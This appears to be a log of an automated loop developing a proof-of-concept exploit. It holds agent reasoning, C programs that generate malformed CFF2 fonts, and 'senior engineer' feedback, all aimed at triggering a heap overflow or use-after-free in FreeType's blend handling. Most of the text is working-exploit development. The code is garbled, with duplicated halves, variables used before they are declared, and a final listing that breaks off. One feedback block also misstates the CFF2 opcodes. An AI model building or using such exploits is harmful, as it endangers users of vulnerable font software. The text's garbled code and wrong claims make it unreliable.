```

This is called after parsing the operands. The function numBlends is obtained from the stack. It does some validation: there is a check for stack underflow (line 1294 in cffload.c). If the stack is not deep enough, it returns an error and does not proceed to the vulnerable code. So the vulnerability is only triggered if the stack has exactly the right number of operands. In our PoC, we have too many operands—the parser might accept extra operands? The code before calling cff_blend_doBlend likely pops the required number. If there are more, they remain on the stack, but the function is still called. So it should be called.

But maybe the blend operator is not recognized because the CFF2 parser uses a different operator table. The `cff_parse_blend` function is registered for operator 0x17 in the private dict operator table. That should work.

Given the persistent failures, perhaps the root cause is that the font is not actually a CFF2 font but an OpenType with CFF2 table? FreeType's API will load it as a CFF2 font. Should work.

Maybe the fuzzer uses the face index incorrectly. It loops over face_index and instance_index. The PoC creates only one face (num_faces=1). The loop will try instance_index 0 (no instance) and 1 (instance 0). For instance 0, setIntermediateAxis is called. That calls FT_Set_Var_Design_Coordinates. This might require the font to have variation data. The font has a VariationStore, so it should have variation axes. However, the variation axis must be defined in the 'fvar' table? For CFF2, variation is handled via CFF2's VariationStore, not fvar. FreeType may still need an fvar table for multiple master support? Actually, CFF2 variations are different from TrueType GX variations. FreeType's CFF2 support uses the CFF2 VariationStore and does not require fvar. But the fuzzer's setIntermediateAxis checks `FT_HAS_MULTIPLE_MASTERS(face)`. For a CFF2 font without fvar, this macro may return false, so it returns early. That's fine.

Then it loads glyphs. For each glyph, it calls FT_Load_Glyph. This will invoke the CFF2 glyph loader.

So why no crash? I think the key is that the blend operator in the Private DICT is only used to compute intermediate values; it does not directly cause a buffer overflow by itself. The vulnerability is in `cff_blend_doBlend` which is called when the blend operator is processed. If we provide a valid set of operands and a large numBlends, we can trigger integer overflow. But we also need to ensure that `subFont->blend_stack` is initially allocated with some size. The first time blend is called, `blend_alloc` might be 0. Then `blend_used` is 0. The check `if (blend_used + size > blend_alloc)` will be true, so realloc is called with `blend_alloc + size`. If `size` is small due to overflow, but `blend_alloc` is 0, then `blend_alloc + size` is the overflowed small size. Then `blend_alloc` becomes that small value, and `blend_used` also becomes that small value (since `blend_used += size`). Then the loop writes `5 * numBlends` bytes but the allocated buffer is only `size` bytes (small). However, `5 * numBlends` is likely huge, so it will overflow massively. That should crash.

But to achieve that, we need to provide a huge `numBlends`. But the stack cannot hold that many operands. So maybe the integer overflow can be triggered with a moderate numBlends that is still large enough to cause integer overflow? For 32-bit, 5*numBlends overflows when numBlends > 0x33333333. That's huge. Not feasible.

Thus the integer overflow scenario is unlikely. Maybe the vulnerability is a different one: the code writes to `blend_top` without checking if it is within the allocated buffer? Actually, the loop writes exactly the amount allocated, so no overflow. Unless the multiplication `5 * numBlends` is used to compute the size but the loop writes `5 * numBlends` bytes, but if `numBlends` is huge, the multiplication overflows, making `size` small, but the loop still writes `5 * numBlends` logically, which is huge, leading to overflow. That is the integer overflow scenario. But we need a huge numBlends. The stack can't hold that many operands. However, maybe the parser does not limit the stack size? Let's search quickly: In cffparse.c, there is a constant `CFF2_MAX_STACK`? Not found in my knowledge. But FreeType's CFF parser uses a fixed-size stack array. Looking at the CFF code, the parser has `parser->top` and `parser->stack` with a maximum size. Typically it's 48 or 100. So we cannot push enough operands to cause integer overflow directly. So the integer overflow might be triggered by a combination of multiple blend operators? Each blend operator increases `blend_used` by `5*numBlends`. Over multiple calls, `blend_used` can become very large. But each individual numBlends is small. However, `blend_used` is a `FT_UInt` (32-bit). If we call blend many times, `blend_used` can overflow, but that would require a huge number of blend operators, which again is limited by the private dict size.

So perhaps the vulnerability is not integer overflow but something else: the initial allocation might be 0, and after realloc, `blend_stack` is set. But `blend_top` is set to `blend_stack + blend_used`. Then `blend_used += size`. Then the loop writes starting from that `blend_top`. That is correct.

I need to read the exact function to see if there is a mistake. Since I cannot READ the file, I'll rely on the provided snippet. The snippet shows:

```c
subFont->blend_used += size;
...
for ( i = 0; i < numBlends; i++ )
{
    ...
    parser->stack[i + base] = subFont->blend_top;   
    *subFont->blend_top++             = 255;
    *((FT_UInt32*)subFont->blend_top) = (FT_UInt32)sum;
    subFont->blend_top               += 4;
}
```

Note: The assignment `parser->stack[i + base] = subFont->blend_top;` stores a pointer to the blend_top into the parser stack. That pointer will be used later. If the blend_stack is later reallocated (e.g., by a subsequent blend operator), that pointer becomes dangling. That is a use-after-free. So the vulnerability is not in the immediate write but in the fact that a pointer into the blend_stack is stored on the parser's stack. If another blend operator is executed later, it may reallocate blend_stack, freeing the old buffer, but the pointer stored on the parser's stack still refers to the old buffer. Then when that pointer is used later (e.g., when operators that reference those blended values are processed), we get use-after-free.

So the attack needs two blend operators: the first one stores pointers, then a second blend operator causes reallocation (freeing the old buffer), making the stored pointers invalid. Then when the first blend's stored pointer is used, it accesses freed memory.

That explains why a single blend operator doesn't crash. We need multiple blend operators in the same private dict such that the first blend's pointers are stored, and later a second blend triggers reallocation and makes them dangling.

In the private dict, after the first blend, we can continue with other operators that use the stored pointers. The stored pointers are pushed onto the parser stack as 'stack[i + base]' (the actual values are pointers to blend_top). These pointers are later used by other operators that read them. If we trigger a second blend that reallocates, those pointers become invalid.

So we need:

1. First blend: with some numBlends, pushing values on stack. This stores pointers to blend_top.
2. Then a second blend: with a larger total size that forces reallocation. This reallocation will free the old blend_stack, but the pointers from the first blend still point to the old buffer.
3. Then trigger an operator that dereferences those pointers (e.g., a subsequent operator that reads the values from the parser stack). For example, the blend operator pushes pointers onto the parser stack, but those pointers are intended to be used by later operators like `hintmask` or other. In CFF2, after blend, the next operator can use those blended values. For example, a `hintmask` operator might read from the stack. But the blend operator itself stores the pointers; the actual blended values are written to blend_top. The pointers on the parser stack are used by subsequent operators to reference those values. So if we place another operator after the first blend that reads from the stack (e.g., a `blend` again, or a `vh` operator), it might use those pointers.

But the typical CFF2 private dict operators that use the blended values are those that have "blend" variants? Actually, the blend operator is a special operator that transforms the stack by replacing a set of values with pointers to blended values. Then subsequent operators can use these pointers as normal operands. So we need to have an operator after the blend that consumes those pointers. If we just have another blend, it will first pop the numBlends and values from the stack, but the pointers from the first blend are still on the stack. The second blend will treat them as operands, possibly causing type confusion, but it might use them incorrectly.

The key is that the stored pointers are of type `CFF_Value` (a union). The parser stack holds values of type `CFF_Value`. The blend operator sets `parser->stack[i + base]` to a pointer (which is stored as a `CFF_Value` with type pointer). Later, when another operator is processed, it might interpret that pointer as an integer or something, causing a crash.

But the more direct path: if the second blend reallocates, the old blend_stack is freed, but the pointers still point to that freed memory. If later an operator reads from those pointers (dereferencing them), we get use-after-free.

So we need to construct a private dict that:

- First: push values and numBlends for first blend. Use operator 0x17.
- Then: push values for second blend, but ensure that the total size (5 * numBlends1 + 5 * numBlends2) exceeds the initial allocation, forcing reallocation. The initial allocation after first blend will be enough for the first blend. The second blend will need more space, triggering reallocation, freeing the old buffer, and the pointers from the first blend become dangling.
- Then: have an operator that uses a pointer from the first blend. That operator could be the second blend itself, because the second blend's `cff_blend_doBlend` reads the `parser->stack` but does it read the pointers? Actually, the second blend's call to `cff_blend_doBlend` uses `parser->stack[i + base]` to write the new pointers. It also reads from parser->stack[base] to get the values? Wait, the function reads the values from the parser stack: it uses `parser->stack[i + base]` to store the pointer, and also reads `parser->stack[i + base]` as the value? Let's look at the snippet:

```c
for ( i = 0; i < numBlends; i++ )
{
    ...
    parser->stack[i + base] = subFont->blend_top;   
    *subFont->blend_top++             = 255;
    *((FT_UInt32*)subFont->blend_top) = (FT_UInt32)sum;
    subFont->blend_top               += 4;
}
```

It reads `sum` from somewhere? Not shown. It computes `sum` from the blend values. It writes to blend_top and stores pointer at stack[i+base]. The first blend stores pointers. Then when the second blend is processed, it will also read from parser->stack[base] to get the values? Actually, the base index is the start of the region for this blend. The function expects that the stack has the operands for this blend at positions base..base+numBlends-1. Those operands were pushed before the blend operator. So the second blend does not read the pointers stored by the first blend; it reads the new operands pushed after the first blend. So the dangling pointers from the first blend are not read by the second blend. They remain on the stack.

Thus to cause a use-after-free, we need an operator after the second blend that reads the older pointers. For example, we could push the first blend's pointers as operands for another operator (like a standard operator that consumes integers). But the stack will have those pointers (of type pointer). Interpreting a pointer as an integer might cause a crash, but not necessarily memory corruption. However, if the pointer is used as a target for writing, it could cause write to freed memory.

But the CFF2 operators that use the blended values are supposed to read the pointers as pointers to the actual values. For example, a `hintmask` operator might read the blended values. But the code for hintmask likely treats the value as an integer, not as a pointer, so type confusion.

This is getting complex. Given the limited turns, I conclude the most likely path forward is to provide a private dict with two blend operators such that the second one forces reallocation, and then follow with an operator that tries to read the stored pointers. However, we must also ensure that the font structure (FDArray, FDSelect, VariationStore) is correct.

But the previous PoC was accepted but not crashed. It had only one blend. So we need to extend it to two blends. That is a new approach not attempted before.

Let's examine the initial allocation: `blend_alloc` starts as 0? In `cff_blend_doBlend`, it checks `blend_used + size > blend_alloc`. Initially `blend_used=0, blend_alloc=0`. So any size >0 will trigger realloc. After first blend, `blend_alloc` becomes `size1`, `blend_used` becomes `size1`. For second blend, if `size2` is >0, then condition `blend_used + size2 > blend_alloc` becomes `size1 + size2 > size1` which is true if size2>0. So reallocation will occur every time. The first blend's pointers become dangling after the second blend reallocates. So even if size2 is small, it will trigger reallocation. So we need at least two blend operators.

But the first blend's pointers are stored on the parser stack. When the second blend reallocates, those pointers still point to the old blend_stack. Then after the second blend, any operator that references those pointers will read freed memory. For example, if we place a `blend` again (third?), it will not read the old pointers. Instead, we need an operator that reads from the stack positions where the first blend stored pointers. The first blend stored pointers at positions base..base+numBlends1-1. Those positions are still on the stack (since the stack is not cleared). Subsequent pushes will push new values on top. So the pointers are still there, but deeper in the stack. To access them, we would need an operator that pops from the stack. If we push new values and then another operator that pops, it will pop the topmost values, which are the new ones, not the old pointers. So to cause use of the old pointers, we would need to ensure that the stack depth is such that the old pointers become the top. That could be done by consuming the top values with some operator, then the old pointers become accessible. But the blend operator consumes a certain number of operands. After the second blend, the stack will have the old pointers (from first blend) plus whatever was pushed for the second blend? Actually, the second blend pops its operands, so after it, the stack will

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    write_cff_byte_int(f, 0);

    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    long offset1_pos = ftell(f);
    fputc(0x00, f);

    long font_dict_start = ftell(f);
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fputc(1 + font_dict_len, f);

    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    fputc(0x00, f);
    fputc(0x00, f);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* vsindex = 0 */
    write_cff_byte_int(f, 0);
    fputc(0x16, f);
    /* First blend: push 5 values, then numBlends=1 */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);

    write_cff_byte_int(f, 60);
    write_cff_byte_int(f, 70);
    write_cff_byte_int(f, 80);

    /* Patch Private DICT size and offset */
    fseek(f, priv_size_pos, SEEK_SET);
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }

    /* ---- CharStrings INDEX ---- */
    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);

    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator with placeholder */
    long charstrings_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    long offset1_pos = ftell(f);
    fputc(0x00, f);

    /* Font DICT */
    long font_dict_start = ftell(f);
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    fputc(0x00, f);
    fputc(0x00, f);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x16, f);
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);
    write_cff_byte_int(f, 60);
    write_cff_byte_int(f, 70);
    write_cff_byte_int(f, 80);
    write_cff_byte_int(f, 90);
    write_cff_byte_int(f, 100);
    write_cff_byte_int(f, 1);
    fputc(0x17, f);
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    fseek(f, priv_size_pos, SEEK_SET);
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX ---- */
    long charstrings_start = ftell(f);
    uint32_t charstrings_offset = charstrings_start - table_start;
    fseek(f, charstrings_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((charstrings_offset >> 8) & 0xFF, f);
    fputc(charstrings_offset & 0xFF, f);
    fseek(f, charstrings_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}

```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Analysis

The root cause of the PoC failure is that the **blend operator opcode is incorrect**. The generator used `0x17` for blend, but in CFF2 the blend operator is `0x18`. The operator `0x17` is `vsindex`, not `blend`. Therefore, the `cff_parse_blend` function was never called, and the vulnerable code path in `cff_blend_doBlend` was never reached.

### Required changes (exact byte offsets and values)

1. **Blend operator opcode** – In the Private DICT, the second occurrence of `0x17` must be changed to `0x18`.  
   - The current generator writes `write_cff_byte_int(f, 1); fputc(0x17, f);` after the five numbers `60 70 80 90 100`.  
   - Change the `fputc(0x17, f)` to `fputc(0x18, f)`.  
   - Also change the preceding count from `1` to `5` (the count of values to blend). I.e., replace `write_cff_byte_int(f, 1);` with `write_cff_byte_int(f, 5);` just before the blend operator.  
   - *(The first `0x17` (vsindex) should remain as `0x17` to set the vsindex; it currently pushes `1` and then `0x17`, which sets vsindex=1. It is fine to keep that as is.)*

2. **Operand stack structure before blend** – The blend operator expects the top stack element to be `numBlends` (the count of preceding values that should be blended). The five numbers `60 70 80 90 100` are the blend values, and the count `5` must be the last operand before the operator. After the change, the Private DICT byte sequence in that region will be:  

   `... 60 70 80 90 100 5 0x18`  
   (where numbers are encoded as CFF2 integers, e.g., using `write_cff_byte_int` for values <= 107, or using the appropriate encoding for larger values. In the current code, all five values are small enough to be encoded with the single-byte bias `+139`, so they are correct.)

3. **vsindex value** – The existing `0x17` (vsindex) sets vsindex=1. The variation store in the PoC contains one region (region index 0). Using vsindex=1 will likely cause an out-of-bounds access when the blend vector is built. To avoid this, change the vsindex operand from `1` to `0`.  
   - In the first Private DICT vsindex block: change `write_cff_byte_int(f, 1);` to `write_cff_byte_int(f, 0);`. The `fputc(0x17, f);` stays.

4. **VariationStore region count** – The variation store currently declares 1 region (`write_uint16(f, 1);`). For vsindex=0, this is correct. No change needed.

5. **All other structure** (OpenType header, CFF2 header, Top DICT, FDArray, FDSelect, CharStrings, Global Subr, VariationStore) remains as generated.

### Summary of exact code modifications in the generator

In the section where the Private DICT is written (around line `write_cff_byte_int(f, 60); ... write_cff_byte_int(f, 1); fputc(0x17, f);`), replace:

```c
write_cff_byte_int(f, 1);   // old count for vsindex
fputc(0x17, f);             // old vsindex operator

// Immediately after the five numbers 60..100:

write_cff_byte_int(f, 1);   // OLD: count for second vsindex
fputc(0x17, f);             // OLD: second vsindex

```

with:

```c
// First vsindex: set vsindex to 0
write_cff_byte_int(f, 0);   // vsindex = 0
fputc(0x17, f);             // vsindex operator

// After the five numbers 60..100: blend block
write_cff_byte_int(f, 5);   // numBlends = 5
fputc(0x18, f);             // blend operator
```

### Why this will reach the vulnerable code

With these changes, the Private DICT parser will encounter the `0x18` operator. The field handler for `CFF_FIELD_BLEND` (code `0x18 | CFF2CODE`) will call `cff_parse_blend`, which reads the top stack element as `numBlends=5`, verifies `priv->subfont` exists, builds the blend vector (if necessary), and then calls `cff_blend_doBlend`. The vulnerability in `cff_blend_doBlend` will then be exercised because the blend stack allocation and out-of-bounds write occurs when `numBlends` is non-zero and the blend stack is small. The current PoC uses `numBlends=5`, which is enough to trigger the heap buffer overflow as described in the vulnerability.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Analysis

The root cause of the PoC failure is a **malformed FDArray INDEX structure**. The CFF2 INDEX format requires `count+1` offset values to be stored **before** the object data. For `count=1`, the byte sequence must be:

```
[count: 4 bytes] [offSize: 1 byte] [offset[0]: offSize bytes] [offset[1]: offSize bytes] [object data]
```

The standard requires:
- `offset[0]` = 1 (always)
- `offset[1]` = 1 + size_of_object

In the current PoC, after writing `count=1` and `offSize=1`, the generator writes **only one** offset byte (offset[0]), then immediately emits the Font DICT data. The parser interprets the first byte of the Font DICT as `offset[1]`, which corrupts the data boundaries. This causes the CFF parser to either fail outright or parse garbage as the Font DICT, preventing it from ever reaching the Private DICT where the blend operator 0x18 resides.

### Required structural fix

Change the FDArray INDEX construction to:

1. Write `count` (uint32, 4 bytes): `1`
2. Write `offSize` (uint8, 1 byte): `1` (since total data fits in 255 bytes)
3. Write `offset[0]` (1 byte): `1`
4. Write `offset[1]` (1 byte): `1 + font_dict_len`
5. Write Font DICT data (`font_dict_len` bytes)

The offset values must be written *before* the Font DICT data, and `offset[1]` must equal `1 + font_dict_len` (not `1 + font_dict_len` written to `offset[0]` as the current code does).

### Additional corrections needed

After fixing the INDEX structure, ensure the remaining offsets are also correct:

- The Font DICT's private dictionary offset must be relative to the start of the CFF2 table (not the file). The generator computes this correctly as `private_start - table_start`.

- The FDSelect must match the actual glyph count. The CharStrings INDEX has one charstring, so the FDSelect must specify `nGlyphs = 1` with one FD byte. Currently it writes `nGlyphs = 0`, which is inconsistent and may cause later failures or early exit.

- The `write_cff_byte_int` helper (which encodes small values as `value + 139`) is used for private dictionary size and offset. If `private_len` or `private_offset` exceed 100, the encoding must use the 0x1C 2-byte form or 0x1D 4-byte form, not `write_cff_byte_int`. The generator already has a conditional for `private_offset`, but the size encoding also needs the same treatment if the private dictionary grows.

### Summary of required byte offset changes

| Location | Current error | Correct value |
|---|---|---|
| FDArray INDEX at count write | After count, writes `offSize` then only `offset[0]` before data | Write `offset[0]=1` and `offset[1]=1+font_dict_len` **before** Font DICT data |
| FDSelect `nGlyphs` | `0x00 0x00` | `0x00 0x01` (1 glyph) with one FD byte following |
| private_size write via `write_cff_byte_int` | Uses `+139` encoding, fails if >100 | Must use generic integer encoding (1-byte for 0-100, else 0x1C+2 bytes, etc.) |

[EMERGENCY CONTINUATION]:
**Root cause:** The FDArray INDEX is malformed. For a CFF2 INDEX with `count=1` and `offSize=1`, the correct byte sequence is:  
 [4‑byte count=1][1‑byte offSize=1][1‑byte offset[0]=1][1‑byte offset[1]=1+font_dict_len][Font DICT data].  
The current PoC writes **only one** offset byte (`offset[0]`) immediately followed by the Font DICT. The parser interprets the first byte of the Font DICT as `offset[1]`, corrupting the data boundaries. This causes the CFF2 table to be rejected during parsing, never reaching the Private DICT where the blend operator (0x18) resides, and thus never triggering `cff_blend_doBlend`.

**Fixed by:**  
1. **Insert `offset[1]` before the Font DICT data** – after writing `offSize`, emit two 1‑byte offsets: `0x01` and `0x01 + font_dict_len`.  
2. **Correct FDSelect** – change `nGlyphs` from `0x0000` to `0x0001` (two bytes `0x00 0x01`) and follow with a single FD index byte.  
3. **Encode private dictionary size/offset correctly** – if `private_len` > 100, use the 0x1C (2‑byte) integer encoding instead of `write_cff_byte_int` (which only works for values 0–100).

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
